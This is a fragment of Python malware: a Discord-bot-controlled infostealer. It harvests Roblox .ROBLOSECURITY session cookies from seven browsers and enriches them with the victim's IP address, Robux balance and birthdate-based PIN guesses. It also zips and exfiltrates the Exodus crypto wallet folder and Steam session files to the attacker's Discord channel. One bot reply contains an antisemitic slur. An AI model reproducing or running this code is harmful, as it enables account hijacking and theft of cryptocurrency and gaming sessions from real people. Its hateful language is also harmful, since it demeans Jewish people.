    browsers = [('Chrome', browser_cookie3.chrome), ('Edge', browser_cookie3.edge), ('Firefox', browser_cookie3.firefox), ('Safari', browser_cookie3.safari), ('Opera', browser_cookie3.opera), ('Brave', browser_cookie3.brave), ('Vivaldi', browser_cookie3.vivaldi)]
    for browser_name, browser in browsers:
        try:
            browser_cookies = browser(domain_name='roblox.com')
            for cookie in browser_cookies:
                if cookie.name == '.ROBLOSECURITY':
                    cookies[browser_name] = cookie.value
        except:
            pass
    return cookies

def get_user_info(cookie):
    url = 'https://www.roblox.com/mobileapi/userinfo'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

def pininfo(cookie):
    url = 'https://users.roblox.com/v1/birthdate'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

def coolinfo(cookie):
    url = 'https://www.roblox.com/my/settings/json'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

cookies = get_roblox_cookie()
# added by codepulze

@bot.command()
async def rocookie(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session or cookies:
        cookies = get_roblox_cookie()
        for browser_name, cookie_value in cookies.items():
            user_info = get_user_info(cookie_value)
            cool_info = coolinfo(cookie_value)
            pin_info = pininfo(cookie_value)

            username = user_info.get('UserName', 'Unknown')
            is_premium = user_info.get('IsPremium', False)
            user_id = user_info.get('UserID', 'Unknown')
            robux_balance = user_info.get('RobuxBalance', 0)
            thumbnail_url = user_info.get('ThumbnailUrl', '')

            year = pin_info.get('birthYear', 'Unknown')
            month = str(pin_info.get('birthMonth', '00')).zfill(2)
            day = str(pin_info.get('birthDay', '00')).zfill(2)
            likely = [username[:4], username[-4:], year, day+day, month+month, month+day, day+month]
            likely = [str(x) for x in likely if str(x).isdigit() and len(str(x)) == 4]

            account_age_in_days = cool_info.get('AccountAgeInDays', 0)
            client_ip_address = cool_info.get('ClientIpAddress', '')

            player_api_url = f"https://www.rolimons.com/playerapi/player/{user_id}"
            response = requests.get(player_api_url)
            player_data = response.json()
            rap = player_data.get('value', 'N/A')

            embed = discord.Embed(
                title=f'New .ROBLOSECURITY cookie found in {browser_name} browser',
                description=(
                    f'[Rolimons](https://www.rolimons.com/player/{user_id}) | [Roblox](https://www.roblox.com/users/{user_id}/profile)\n'
                    f'👤 **Username:** {username}\n'
                    f'🛡️ **Is Premium:** {":white_check_mark:" if is_premium else ":x:"}\n'
                    f'🔢 **ID:** {user_id}\n'
                    f'💰 **Robux Balance:** {robux_balance}\n'
                    f'📈 **(RAP) Recent Average Price:** {rap}\n'
                    f'📅 **Account Age:** {account_age_in_days} days\n'
                    f'🌐 **IP Address:** {client_ip_address}\n'
                    f'💡 **Likely Pins:** {", ".join(likely)}\n'
                    f'🍪 **Cookie:** ```{cookie_value}```\n'
                ),
                color=0x9b59b6,
            )
            embed.set_thumbnail(url=thumbnail_url)
            await ctx.send(embed=embed)
        else:
           ctx.send("provide key pls you fucking jew")
# added by codepulze

@bot.command()
async def exodus(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
     user = os.path.expanduser("~")
    
    v1 = user + "\\AppData\\Roaming\\Exodus"
    v2 = user + "\\AppData\\Local\\Temp\\Exodus"
    v3 = user + "\\AppData\\Local\\Temp\\Exodus.zip"

    if os.path.exists(v2):
        shutil.rmtree(v2)

    if os.path.exists(v1):
        shutil.copytree(v1, v2)
        shutil.make_archive(v2, "zip", v2)

        await ctx.send(file=discord.File(v3))

        try:
            os.remove(v3)
            os.remove(v2)
        except Exception as e:
            print(f"Error: {e}")
# added by codepulze
@bot.command()
async def steam(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
     v1 = ""
    if os.path.exists(os.environ["PROGRAMFILES(X86)"] + "\\steam"):
        v1 = os.environ["PROGRAMFILES(X86)"] + "\\steam"
        v2 = []
        v3 = ""
        for file in os.listdir(v1):
            if file[:4] == "ssfn":
                v2.append(v1 + f"\\{file}")

        def v4(path, path1, steam_session):
            for root, dirs, file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root + "\\" + file)
            for file2 in path1:
                steam_session.write(file2)

        if os.path.exists(v1 + "\\config"):
            with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip", 'w', zipfile.ZIP_DEFLATED) as zp:
                v4(v1 + "\\config", v2, zp)

            await ctx.send("Steam Session:", file=discord.File(f"{os.environ['TEMP']}\\steam_session.zip"))

            try:
                os.remove(f"{os.environ['TEMP']}\\steam_session.zip")
            except:
                pass


bot.run(config['token'])
